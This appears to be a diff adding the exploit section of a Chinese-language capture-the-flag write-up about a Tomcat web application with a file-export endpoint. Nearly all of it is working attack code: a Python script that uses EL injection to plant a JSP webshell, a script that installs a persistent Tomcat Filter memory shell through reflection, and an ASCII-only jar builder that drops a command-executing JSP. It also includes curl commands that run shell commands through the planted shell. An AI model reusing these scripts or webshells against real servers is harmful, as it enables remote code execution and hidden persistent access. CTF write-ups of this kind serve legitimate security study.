+    cd = (b"PK\x01\x02" + struct.pack("<HHHHHH", 0x000A, 0x000A, 0x0008, 0x0008, 0, 0)
+          + struct.pack("<LLL", crc, len(data), len(raw))
+          + struct.pack("<HHHHH", len(zip_name), 0, 0, 0, 0)
+          + struct.pack("<LL", 0, 27) + zip_name)
+    eocd = (b"PK\x05\x06" + struct.pack("<HHHH", 0, 0, 1, 1)
+            + struct.pack("<LL", len(cd), len(data) + len(zip_name) + 0x1e + 27)
+            + struct.pack("<H", len(PAD_TAIL) + len(SUFFIX)))
+    return lfh + data + cd + eocd + PAD_TAIL
+
+
+def attack(target, cmd, name="shell.jsp"):
+    zip_name = f"META-INF/resources/{name}".encode()
+    raw, data = find_content(zip_name)
+    content = build_jar(raw, data, zip_name)
+    assert all(b < 0x80 and b not in {38, 60, 39, 62, 34, 40, 41} for b in content), "content unsafe"
+    r = requests.post(f"{target}/export", data={"dir": "./WEB-INF/lib/", "filename": "a.jar", "content": content.decode("latin-1")})
+    assert r.status_code == 200, r.text
+    requests.post(f"{target}/export", data={"dir": "./WEB-INF/tomcat-web.xml/", "filename": "x", "content": "x"})
+    time.sleep(12)
+    r = requests.get(f"{target}/{name}", params={"c": cmd}, timeout=15)
+    out = r.text.strip().split("-->")[-1].strip()
+    return out.rstrip("\x00")
+
+
+if __name__ == "__main__":
+    t = sys.argv[1].rstrip("/")
+    c = sys.argv[2] if len(sys.argv) > 2 else "id"
+    n = sys.argv[3] if len(sys.argv) > 3 else "shell.jsp"
+    print(attack(t, c, n))
+```
+
+`compress_lib.py` 是从 Arusekk 的 ascii-zip 截的压缩器类
+
+![](./assets/006.png)
+### exp
+
+```python
+#!/usr/bin/env python3
+import sys
+import time
+
+import requests
+
+TARGET = sys.argv[1].rstrip("/")
+
+EL = """${pageContext.servletContext.classLoader.resources.context.manager.pathname=param.a}
+${sessionScope[param.b]=param.c}
+${pageContext.servletContext.classLoader.resources.context.reloadable=true}
+${pageContext.servletContext.classLoader.resources.context.parent.appBase=param.d}"""
+
+JSP = '<%java.io.InputStream i=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",request.getParameter("cmd")}).getInputStream();byte[] b=new byte[8192];int n;while((n=i.read(b))>0){out.print(new String(b,0,n));}%>'
+
+r = requests.post(f"{TARGET}/export", data={"dir": "", "filename": "a.jsp", "content": EL})
+el = f"{TARGET}/export/{r.text.strip().split('/')[-1]}"
+requests.post(el, data={"a": "/tmp/session.jsp", "b": "k", "c": JSP, "d": "/"})
+requests.post(f"{TARGET}/export", data={"dir": "./WEB-INF/lib/", "filename": "a.jar", "content": "x"})
+time.sleep(12)
+print(f"{TARGET}/tmp/session.jsp")
+
+"""
+Usage:
+  python3 el_webshell.py http://127.0.0.1:8080
+
+Demo:
+  curl "http://127.0.0.1:8080/tmp/session.jsp?cmd=id"
+  curl "http://127.0.0.1:8080/tmp/session.jsp?cmd=/readflag"
+"""
+```
+
+```python
+#!/usr/bin/env python3
+import base64
+import subprocess
+import sys
+import time
+
+import requests
+
+TARGET = sys.argv[1].rstrip("/")
+
+EL = """${pageContext.servletContext.classLoader.resources.context.manager.pathname=param.a}
+${sessionScope[param.b]=param.c}
+${pageContext.servletContext.classLoader.resources.context.reloadable=true}
+${pageContext.servletContext.classLoader.resources.context.parent.appBase=param.d}"""
+
+JSP = '<%java.io.InputStream i=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",request.getParameter("cmd")}).getInputStream();byte[] b=new byte[8192];int n;while((n=i.read(b))>0){out.print(new String(b,0,n));}%>'
+
+
+def get_shell():
+    r = requests.post(f"{TARGET}/export", data={"dir": "", "filename": "a.jsp", "content": EL})
+    assert r.status_code == 200 and "/" in r.text, "export failed, restart environment first"
+    el = f"{TARGET}/export/{r.text.strip().split('/')[-1]}"
+    requests.post(el, data={"a": "/tmp/session.jsp", "b": "k", "c": JSP, "d": "/"})
+    requests.post(f"{TARGET}/export", data={"dir": "./WEB-INF/lib/", "filename": "a.jar", "content": "x"})
+    time.sleep(12)
+    return f"{TARGET}/tmp/session.jsp"
+
+
+def shell_exec(shell, cmd):
+    r = requests.post(shell, data={"cmd": cmd}, timeout=30)
+    d = r.text.encode("utf-8", errors="replace")
+    i = d.rfind(b"kt\x00")
+    return d[i + 3:].decode("utf-8", errors="replace").strip()
+
+
+def upload_b64(shell, b64data, remote):
+    for i in range(0, len(b64data), 100_000):
+        chunk = b64data[i:i + 100_000]
+        op = ">" if i == 0 else ">>"
+        shell_exec(shell, f"echo {chunk} {op} /tmp/t.b64")
+        time.sleep(0.1)
+    out = shell_exec(shell, f"base64 -d /tmp/t.b64 > {remote} && md5sum {remote}")
+    return out
+
+
+def install_filter(shell):
+    subprocess.run(["javac", "-cp", "/tmp/servlet-api.jar", "FilterMemshell.java"], check=True)
+    fb64 = base64.b64encode(open("FilterMemshell.class", "rb").read()).decode()
+    jsp = f'''<%@ page import="java.lang.reflect.*,java.util.*" %>
+<%!
+String B64 = "{fb64}";
+public byte[] b64d(String s) throws Exception {{
+    try {{
+        Class<?> c = Class.forName("java.util.Base64");
+        Object d = c.getMethod("getDecoder").invoke(null);
+        return (byte[]) d.getClass().getMethod("decode", String.class).invoke(d, s);
+    }} catch (Exception e) {{
+        Class<?> c = Class.forName("sun.misc.BASE64Decoder");
+        Object d = c.newInstance();
+        return (byte[]) d.getClass().getMethod("decodeBuffer", String.class).invoke(d, s);
+    }}
+}}
+%>
+<%
+ServletContext sc = request.getServletContext();
+Field f1 = sc.getClass().getDeclaredField("context");
+f1.setAccessible(true);
+Object ac = f1.get(sc);
+Field f2 = ac.getClass().getDeclaredField("context");
+f2.setAccessible(true);
+Object ctx = f2.get(ac);
+Field fcF = ctx.getClass().getDeclaredField("filterConfigs");
+fcF.setAccessible(true);
+Map<String, Object> fcs = (Map) fcF.get(ctx);
+if (!fcs.containsKey("memshell")) {{
+    ClassLoader cl = Thread.currentThread().getContextClassLoader();
+    Class<?> fc = null;
+    try {{
+        fc = Class.forName("FilterMemshell", false, cl);
+    }} catch (ClassNotFoundException e) {{
+        byte[] cb = b64d(B64);
+        Method define = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+        define.setAccessible(true);
+        fc = (Class<?>) define.invoke(cl, cb, 0, cb.length);
+    }}
+    Class<?> fdC = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
+    Object fd = fdC.newInstance();
+    fdC.getMethod("setFilterName", String.class).invoke(fd, "memshell");
+    fdC.getMethod("setFilterClass", String.class).invoke(fd, fc.getName());
+    ctx.getClass().getMethod("addFilterDef", fdC).invoke(ctx, fd);
+    Field fmF = ctx.getClass().getDeclaredField("filterMaps");
+    fmF.setAccessible(true);
+    Object cfm = fmF.get(ctx);
+    Method arrM = cfm.getClass().getMethod("asArray");
+    arrM.setAccessible(true);
+    boolean mapped = false;
+    for (Object m : (Object[]) arrM.invoke(cfm)) {{
+        String n = (String) m.getClass().getMethod("getFilterName").invoke(m);
+        if ("memshell".equals(n)) {{ mapped = true; break; }}
+    }}
+    if (!mapped) {{
+        Class<?> fmC = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
+        Object fm = fmC.newInstance();
+        fmC.getMethod("setFilterName", String.class).invoke(fm, "memshell");
+        fmC.getMethod("addURLPattern", String.class).invoke(fm, "/*");
+        Method addM = cfm.getClass().getMethod("add", fmC);
+        addM.setAccessible(true);
+        addM.invoke(cfm, fm);
+    }}
+    Class<?> fciC = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
+    Constructor<?> fciCtor = fciC.getDeclaredConstructor(Class.forName("org.apache.catalina.Context"), fdC);
+    fciCtor.setAccessible(true);
+    fcs.put("memshell", fciCtor.newInstance(ctx, fd));
+    out.print("installed");
+}} else {{
+    out.print("already");
+}}
+%>'''
+    jb64 = base64.b64encode(jsp.encode()).decode()
+    upload_b64(shell, jb64, "/tmp/memshell.jsp")
+    r = requests.get(f"{TARGET}/tmp/memshell.jsp", timeout=30)
+    print("filter memshell:", r.text.strip())
+    r = requests.get(f"{TARGET}/tmp/memshell.jsp", params={"cmd": "id"}, timeout=15)
+    print("verify:", r.text.strip().split("-->")[-1].strip())
+
+
+shell = get_shell()
+print("webshell:", shell)
+install_filter(shell)
+
+"""
+Usage:
+  python3 memshell.py http://127.0.0.1:8080
+
+Flow:
+  EL chain -> webshell -> upload memshell.jsp (FilterMemshell) -> trigger
+
+Demo:
+  curl "http://127.0.0.1:8080/tmp/anything?cmd=id"
+  curl "http://127.0.0.1:8080/tmp/session.jsp?cmd=/readflag"
+"""
+```
+
+```python
+#!/usr/bin/env python3
+import contextlib
+import io
+import struct
+import sys
+import time
+import zlib
+
+import requests
+from compress_lib import ASCIICompressor
+
+PREFIX = b"DIRTY DATA AT THE BEGINNING "
+SUFFIX = b" DIRTY DATA AT THE END"
+PAD_TAIL = b"C0NY1"
+JSP_BODY = b'<%out.print(new java.util.Scanner(Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",request.getParameter("c")}).getInputStream()).useDelimiter("\\\\A").next());%>\n'
+ALLOW = set(range(128)) - {38, 60, 39, 62, 34, 40, 41}
+
+
+def fld_ok(n):
+    return all((n >> s) & 0xff in ALLOW for s in (0, 8, 16, 24))
+
+
+def find_content(zip_name):
+    comp = ASCIICompressor(bytearray(ALLOW))
+    cands = []
+    for pad in range(300, 3000):
+        raw = b"<!-- " + b"A" * pad + b" -->\n" + JSP_BODY
+        if fld_ok(zlib.crc32(raw)) and fld_ok(len(raw)):
+            cands.append(raw)
+    for raw in cands:
+        with contextlib.redirect_stdout(io.StringIO()):
+            data = comp.compress(bytearray(raw))[0]
+        if fld_ok(len(data)) and fld_ok(len(data) + len(zip_name) + 0x1e + 27):
+            return raw, data
+    raise SystemExit("no fit")
+
+
+def build_jar(raw, data, zip_name):
+    crc = zlib.crc32(raw) % pow(2, 32)
+    lfh = (b"PK\x03\x04" + struct.pack("<HHHHH", 0x000A, 0x0008, 0x0008, 0, 0)
+           + struct.pack("<LLL", 0, 0, 0)
+           + struct.pack("<HH", len(zip_name), 0) + zip_name)
+    cd = (b"PK\x01\x02" + struct.pack("<HHHHHH", 0x000A, 0x000A, 0x0008, 0x0008, 0, 0)
+          + struct.pack("<LLL", crc, len(data), len(raw))
+          + struct.pack("<HHHHH", len(zip_name), 0, 0, 0, 0)
+          + struct.pack("<LL", 0, 27) + zip_name)
+    eocd = (b"PK\x05\x06" + struct.pack("<HHHH", 0, 0, 1, 1)
+            + struct.pack("<LL", len(cd), len(data) + len(zip_name) + 0x1e + 27)
+            + struct.pack("<H", len(PAD_TAIL) + len(SUFFIX)))
+    return lfh + data + cd + eocd + PAD_TAIL
+
+
+def attack(target, cmd, name="shell.jsp"):
+    zip_name = f"META-INF/resources/{name}".encode()
+    raw, data = find_content(zip_name)
+    content = build_jar(raw, data, zip_name)
+    assert all(b < 0x80 and b not in {38, 60, 39, 62, 34, 40, 41} for b in content), "content unsafe"
+    r = requests.post(f"{target}/export", data={"dir": "./WEB-INF/lib/", "filename": "a.jar", "content": content.decode("latin-1")})
+    assert r.status_code == 200, r.text
+    requests.post(f"{target}/export", data={"dir": "./WEB-INF/tomcat-web.xml/", "filename": "x", "content": "x"})
+    time.sleep(12)
+    r = requests.get(f"{target}/{name}", params={"c": cmd}, timeout=15)
+    out = r.text.strip().split("-->")[-1].strip()
+    return out.rstrip("\x00")
+
+
+if __name__ == "__main__":
+    t = sys.argv[1].rstrip("/")
+    c = sys.argv[2] if len(sys.argv) > 2 else "id"
+    n = sys.argv[3] if len(sys.argv) > 3 else "shell.jsp"
+    print(attack(t, c, n))
+
+
+# python3 ascii_attack.py http://127.0.0.1:8080 ls
+```
+
+el_webshell.py 打 webshell，memshell.py 通过 EL webshell 上传 JSP Filter 内存马，ascii_attack.py 完全不使用 EL（ASCII jar 路线）。
 
 
 > https://github.com/FightingLzn9/AgentMemshell/releases/tag/v1
+> https://gv7.me/articles/2022/rwctf-4th-desperate-cat-ascii-jar-writeup/
+> https://github.com/Arusekk/ascii-zip
+> https://github.com/voidfyoo/rwctf-4th-desperate-cat/tree/main/writeup
